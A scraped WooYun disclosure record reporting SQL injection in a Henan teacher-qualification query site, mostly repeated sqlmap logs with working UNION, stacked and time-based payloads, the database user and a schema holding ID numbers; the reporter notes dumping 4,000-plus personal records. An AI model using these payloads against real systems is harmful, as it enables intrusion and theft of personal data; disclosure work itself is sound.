{"id": 42393, "wybug_id": "wooyun-2014-085930", "wybug_title": "某省教师资格网存在SQL注入（可泄漏个人信息）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "ki11y0u", "wybug_date": "2014-12-05 12:46", "wybug_open_date": "2015-01-19 12:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向公众公开  简要描述： 基于时间的POST盲注，有点纠结。 详细说明：  网址：http://cx.jszg.haedu.cn/jszgcsjgcx.aspx打开是这样的： \n\n看了下IP，河南省教育厅的。测试看了一下，好多库，不乱搞了，来提交吧~~~单位名称，查询处存在POST注入，可以造成个人敏感信息泄漏。忘了截图了，上日志：\nsqlmap identified the following injection points with a total of 1228 HTTP(s) requests:---Place: POSTParameter: HiddenFieldYear    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(103)+CHAR(102)+CHAR(120)+CHAR(113)+CHAR(100)+CHAR(85)+CHAR(120)+CHAR(107)+CHAR(109)+CHAR(86)+CHAR(82)+CHAR(75)+CHAR(74)+CHAR(122)+CHAR(113)+CHAR(104)+CHAR(103)+CHAR(115)+CHAR(113)-- &__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014; WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: HiddenFieldYear    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(103)+CHAR(102)+CHAR(120)+CHAR(113)+CHAR(100)+CHAR(85)+CHAR(120)+CHAR(107)+CHAR(109)+CHAR(86)+CHAR(82)+CHAR(75)+CHAR(74)+CHAR(122)+CHAR(113)+CHAR(104)+CHAR(103)+CHAR(115)+CHAR(113)-- &__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014; WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005current user:    'chaxun'current database:    'chaxun_haedu'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---\n总共35个数据库,如图;\n\nchaxun_haedu库下，16个表：\n\n字段：\nPlace: POSTParameter: HiddenFieldYear    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(103)+CHAR(102)+CHAR(120)+CHAR(113)+CHAR(100)+CHAR(85)+CHAR(120)+CHAR(107)+CHAR(109)+CHAR(86)+CHAR(82)+CHAR(75)+CHAR(74)+CHAR(122)+CHAR(113)+CHAR(104)+CHAR(103)+CHAR(115)+CHAR(113)-- &__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014; WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005Database: chaxun_haeduTable: ceshijieguo2014[6 columns]+-------------+----------+| Column      | Type     |+-------------+----------+| ceshijieguo | nvarchar || danwei      | nvarchar || id          | int      || sfzh        | nvarchar || xingbie     | nvarchar || xingming    | nvarchar |+-------------+----------+\ndump看了一下，4K多条记录，一些个人敏感信息：\n\n不知道其他库里有没有敏感信息，不乱搞了，我是好淫。希望尽快修复。   漏洞证明：  \nsqlmap identified the following injection points with a total of 1228 HTTP(s) requests:---Place: POSTParameter: HiddenFieldYear    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(103)+CHAR(102)+CHAR(120)+CHAR(113)+CHAR(100)+CHAR(85)+CHAR(120)+CHAR(107)+CHAR(109)+CHAR(86)+CHAR(82)+CHAR(75)+CHAR(74)+CHAR(122)+CHAR(113)+CHAR(104)+CHAR(103)+CHAR(115)+CHAR(113)-- &__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014; WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMTM0Nzc3ODY3OA9kFgICAw9kFgICAw8WAh4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQtpYnRuc3VibWl0MQULaWJ0bnN1Ym1pdDKH5sLCxm3w+mnKWXEpcInuO/LcdA==&xm=&dw=&danwei=a&ibtnsubmit2.x=54&ibtnsubmit2.y=17&HiddenFieldYear=2014 WAITFOR DELAY '0:0:5'--&__EVENTVALIDATION=/wEWBwKkn8n2CgLY77bvDAK8787vDAKaib+RBgLJk+H4DwL/n6H8CwLhvoKsCQIr9EcRMBFhIVq/5ciKWIJTYjiD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---\n   修复方案：  过滤过滤。   版权声明：转载请注明来源 ki11y0u@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-12-10 09:17 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}